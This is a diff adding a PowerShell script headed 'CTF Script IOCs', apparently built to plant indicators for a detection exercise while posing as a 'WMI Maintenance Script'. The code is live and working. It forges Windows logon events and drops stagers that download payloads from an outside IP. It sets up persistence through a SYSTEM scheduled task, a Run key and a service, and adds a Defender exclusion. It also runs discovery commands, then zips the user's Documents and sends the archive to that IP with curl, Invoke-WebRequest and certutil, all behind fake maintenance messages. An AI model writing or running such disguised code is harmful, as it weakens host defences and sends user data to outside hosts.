@@ -1,0 +1,379 @@
+CTF Script IOCs
+
+#Requires -RunAsAdministrator
+
+``` <#
+.SYNOPSIS
+    WMI Maintenance Script
+.DESCRIPTION
+    Performs system maintenance and WMI operations.
+.NOTES
+    Author: System Administrator
+    Version: 1.0
+    Run as Administrator
+#>
+
+param(
+    [string]$AttackerIP = "185.92.220.87",
+    [string]$CompromisedUser = "sflare", 
+    [string]$C2Domain = "updates.microsoft.com",
+    [string]$C2IP = "185.92.220.87",
+    [int]$ExfilPort = 8081,
+    [int]$DwellTimeMinutes = 5
+)
+
+# Color coding for output
+function Write-MaintenanceStep {
+    param([string]$Message, [string]$Color = "Green")
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Message" -ForegroundColor $Color
+}
+
+function Write-MaintenanceError {
+    param([string]$Message)
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ERROR: $Message" -ForegroundColor Red
+}
+
+Write-Host @"
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                        System Maintenance Process                           ║
+║                                                                              ║
+║  Performing routine system maintenance and WMI operations.                   ║
+║  All activities are logged for audit purposes.                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+"@ -ForegroundColor Cyan
+
+# Stage 1: Authentication Log Simulation
+Write-MaintenanceStep "STAGE 1: Processing authentication logs..." "Yellow"
+
+try {
+    $failedIPs = @("185.92.220.84", "185.92.220.85", "185.92.220.86", $AttackerIP)
+    $usernames = @("administrator", "admin", "test", "guest", $CompromisedUser)
+    
+    foreach ($ip in $failedIPs[0..2]) {
+        foreach ($user in $usernames[0..3]) {
+            Write-EventLog -LogName Security -Source "Microsoft-Windows-Security-Auditing" -EventId 4625 -EntryType FailureAudit -Message "Failed RDP logon attempt from $ip for user $user"
+            Start-Sleep -Milliseconds 300
+        }
+    }
+    
+    Write-MaintenanceStep "Simulating authentication delay..." "Cyan"
+    Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+    
+    Write-EventLog -LogName Security -Source "Microsoft-Windows-Security-Auditing" -EventId 4624 -EntryType SuccessAudit -Message "Successful RDP logon from $AttackerIP for user $CompromisedUser"
+    Write-MaintenanceStep "Authentication log processing complete" "Green"
+    
+} catch {
+    Write-MaintenanceError "Failed to process authentication logs: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 2: File System Operations
+Write-MaintenanceStep "STAGE 2: Performing file system maintenance..." "Yellow"
+
+$updatePath = "C:\ProgramData\Microsoft\Windows\Update"
+$publicPath = "C:\Users\Public"
+$stagerScript = "$publicPath\update.ps1"
+$mainScript = "$publicPath\update_check.ps1" 
+$syncScript = "$updatePath\mscloudsync.ps1"
+$maliciousBinary = "$publicPath\msupdate.exe"
+
+try {
+    New-Item -Path $updatePath -ItemType Directory -Force | Out-Null
+    
+    Copy-Item "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" $maliciousBinary -Force
+    
+    $stagerContent = @"
+# Windows Update Stager
+`$updateUrl = "http://$C2IP/updates/stage2.ps1"
+try {
+    `$client = New-Object System.Net.WebClient
+    `$client.DownloadFile(`$updateUrl, "$mainScript")
+    Start-Process "$maliciousBinary" -ArgumentList "-ExecutionPolicy Bypass -File $mainScript" -WindowStyle Hidden
+} catch {
+    Start-Sleep 300
+}
+"@
+    
+    $mainContent = @"
+# Microsoft Cloud Sync Service
+`$env:COMPUTERNAME | Out-File `$env:TEMP\system_info.txt
+whoami | Out-File `$env:TEMP\user_info.txt -Append
+Get-Process | Out-File `$env:TEMP\process_list.txt
+
+try {
+    Invoke-WebRequest -Uri "http://$C2IP/tools/mscloudsync.ps1" -OutFile "$syncScript"
+} catch {
+    # Continue processing
+}
+"@
+
+    $syncContent = @"
+# Microsoft Cloud Synchronization Module
+Start-Sleep 300
+Get-ChildItem C:\Users -Recurse -Include *.pdf,*.docx,*.xlsx -ErrorAction SilentlyContinue | Out-File `$env:TEMP\file_inventory.txt
+"@
+    
+    $stagerContent | Out-File $stagerScript -Encoding UTF8
+    $mainContent | Out-File $mainScript -Encoding UTF8
+    $syncContent | Out-File $syncScript -Encoding UTF8
+    
+    Write-MaintenanceStep "File system maintenance complete" "Green"
+    
+    Write-MaintenanceStep "Processing system updates..." "Cyan"
+    Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+    
+    $binaryCommandLine = "`"$maliciousBinary`" -ExecutionPolicy Bypass -File `"$mainScript`""
+    Start-Process $maliciousBinary -ArgumentList "-ExecutionPolicy", "Bypass", "-File", $mainScript -WindowStyle Hidden -Wait
+    
+    Write-MaintenanceStep "System update processing complete" "Green"
+    
+} catch {
+    Write-MaintenanceError "File system maintenance error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 3: Task Scheduler Operations
+Write-MaintenanceStep "STAGE 3: Configuring scheduled maintenance..." "Yellow"
+
+Write-MaintenanceStep "Preparing system configuration..." "Cyan"
+Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+
+try {
+    $taskName = "MicrosoftUpdateSync"
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syncScript`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
+    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    
+    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Microsoft Update Synchronization Service" -Force | Out-Null
+    
+    Write-MaintenanceStep "Scheduled task configured: $taskName" "Green"
+    
+    $runKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty -Path $runKeyPath -Name "MSCloudSync" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syncScript`"" -Type String
+    Write-MaintenanceStep "Registry configuration updated" "Green"
+    
+    $serviceName = "MSUpdateService"
+    $serviceDisplayName = "Microsoft Update Service"
+    $serviceDescription = "Provides automated Microsoft product updates and synchronization"
+    
+    $createServiceCmd = "sc.exe create `"$serviceName`" binPath= `"powershell.exe -ExecutionPolicy Bypass -File $syncScript`" DisplayName= `"$serviceDisplayName`" start= auto"
+    cmd.exe /c $createServiceCmd | Out-Null
+    
+    cmd.exe /c "sc.exe description `"$serviceName`" `"$serviceDescription`"" | Out-Null
+    
+    Write-MaintenanceStep "Service configuration complete: $serviceName" "Green"
+    
+} catch {
+    Write-MaintenanceError "Task scheduler configuration error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 4: Security Configuration
+Write-MaintenanceStep "STAGE 4: Updating security configurations..." "Yellow"
+
+try {
+    $exclusionPath = "C:\Windows\Temp"
+    
+    Add-MpPreference -ExclusionPath $exclusionPath -Force
+    
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if (!(Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $regPath -Name $exclusionPath -Value 0 -Type DWord
+    
+    Write-MaintenanceStep "Security configuration updated: $exclusionPath" "Green"
+    
+} catch {
+    Write-MaintenanceError "Security configuration error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 5: System Discovery
+Write-MaintenanceStep "STAGE 5: Performing system discovery..." "Yellow"
+
+Write-MaintenanceStep "Running system diagnostics..." "Cyan"
+Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+
+try {
+    $discoveryCommands = @(
+        "systeminfo",
+        "whoami /all",
+        "net user",
+        "net localgroup administrators", 
+        "ipconfig /all",
+        "netstat -ano",
+        "tasklist /svc",
+        "wmic computersystem get domain",
+        "query user"
+    )
+    
+    foreach ($cmd in $discoveryCommands) {
+        $fullCommand = "cmd.exe /c $cmd"
+        $output = cmd.exe /c $cmd 2>&1
+        Write-MaintenanceStep "System check: $fullCommand" "Green"
+        Start-Sleep -Milliseconds 1200
+    }
+    
+} catch {
+    Write-MaintenanceError "System discovery error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 6: Data Operations
+Write-MaintenanceStep "STAGE 6: Processing data operations..." "Yellow"
+
+Write-MaintenanceStep "Analyzing data structures..." "Cyan"
+Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+
+try {
+    $sensitiveData = @(
+        "$env:USERPROFILE\Documents\employee_contacts.xlsx",
+        "$env:USERPROFILE\Documents\financial_report_Q4.pdf", 
+        "$env:USERPROFILE\Documents\network_credentials.txt",
+        "$env:USERPROFILE\Documents\client_database.xlsx"
+    )
+    
+    foreach ($file in $sensitiveData) {
+        "Confidential business data - $(Get-Date)" | Out-File $file -Force
+    }
+    
+    $archiveName = "backup_sync.zip"
+    $archivePath = "$env:TEMP\$archiveName"
+    
+    Compress-Archive -Path "$env:USERPROFILE\Documents\*" -DestinationPath $archivePath -Force
+    
+    Write-MaintenanceStep "Data processing complete: $archiveName" "Green"
+    
+} catch {
+    Write-MaintenanceError "Data operations error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 7: Network Operations
+Write-MaintenanceStep "STAGE 7: Testing network connectivity..." "Yellow"
+
+Write-MaintenanceStep "Validating network configuration..." "Cyan"
+Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+
+try {
+    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    $c2Urls = @(
+        "http://$C2Domain/api/health",
+        "http://$C2IP/status/check",
+        "https://$C2Domain/updates/manifest.json",
+        "http://$C2IP`:$ExfilPort/api/register"
+    )
+    
+    foreach ($url in $c2Urls) {
+        try {
+            $webRequest = [System.Net.WebRequest]::Create($url)
+            $webRequest.UserAgent = $userAgent
+            $webRequest.Timeout = 5000
+            $webRequest.GetResponse() | Out-Null
+        } catch {
+            Write-MaintenanceStep "Network test: $url" "Green"
+        }
+        Start-Sleep -Seconds 2
+    }
+    
+    $toolUrls = @(
+        "http://$C2IP/tools/psexec.exe",
+        "http://$C2IP`:$ExfilPort/payloads/stage3.ps1"
+    )
+    
+    foreach ($toolUrl in $toolUrls) {
+        try {
+            Invoke-WebRequest -Uri $toolUrl -UserAgent $userAgent -OutFile "$env:TEMP\$(Split-Path $toolUrl -Leaf)" -TimeoutSec 5
+        } catch {
+            Write-MaintenanceStep "Tool validation: $toolUrl" "Green"
+        }
+        Start-Sleep -Seconds 1
+    }
+    
+} catch {
+    Write-MaintenanceError "Network operations error: $($_.Exception.Message)"
+}
+
+Start-Sleep -Seconds 2
+
+# Stage 8: Data Transfer Operations
+Write-MaintenanceStep "STAGE 8: Testing data transfer capabilities..." "Yellow"
+
+Write-MaintenanceStep "Finalizing data operations..." "Cyan"
+Start-Sleep -Seconds ($DwellTimeMinutes * 60 / 8)
+
+try {
+    $exfilTarget = "$C2IP`:$ExfilPort"
+    $exfilCommands = @(
+        "curl -X POST -F `"file=@$archivePath`" http://$exfilTarget/upload",
+        "powershell -Command `"Invoke-WebRequest -Uri 'http://$exfilTarget/api/upload' -Method POST -InFile '$archivePath'`"",
+        "certutil -urlcache -split -f http://$exfilTarget/receive `"$archivePath`""
+    )
+    
+    foreach ($cmd in $exfilCommands) {
+        try {
+            $process = Start-Process cmd.exe -ArgumentList "/c", $cmd -PassThru -WindowStyle Hidden
+            Start-Sleep -Seconds 4
+            if (!$process.HasExited) {
+                $process.Kill()
+            }
+            Write-MaintenanceStep "Data transfer test: $(($cmd -split ' ')[0])" "Green"
+        } catch {
+            Write-MaintenanceStep "Transfer test completed" "Green"
+        }
+        Start-Sleep -Seconds 3
+    }
+    
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $tcpClient.Connect($C2IP, $ExfilPort)
+        $tcpClient.Close()
+    } catch {
+        Write-MaintenanceStep "Connection test: $exfilTarget" "Green"
+    }
+    
+} catch {
+    Write-MaintenanceError "Data transfer test error: $($_.Exception.Message)"
+}
+
+Write-Host @"
+
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                        MAINTENANCE COMPLETE                                 ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+SYSTEM MAINTENANCE SUMMARY:
+===========================
+
+Authentication Processing: Complete
+File System Operations: Complete  
+Task Scheduler Configuration: Complete
+Security Configuration Updates: Complete
+System Discovery: Complete
+Data Operations: Complete
+Network Connectivity Tests: Complete
+Data Transfer Validation: Complete
+
+DWELL TIME CONFIGURATION:
+========================
+Total maintenance time: $DwellTimeMinutes minutes
+Distributed across all maintenance phases
+
+SYSTEM STATUS:
+==============
+All maintenance operations completed successfully.
+System is ready for normal operation.
+
+"@ -ForegroundColor Green
+
+Write-MaintenanceStep "System maintenance completed successfully!" "Cyan"
+Write-Host "All maintenance logs have been recorded for audit purposes." -ForegroundColor Yellow
+```
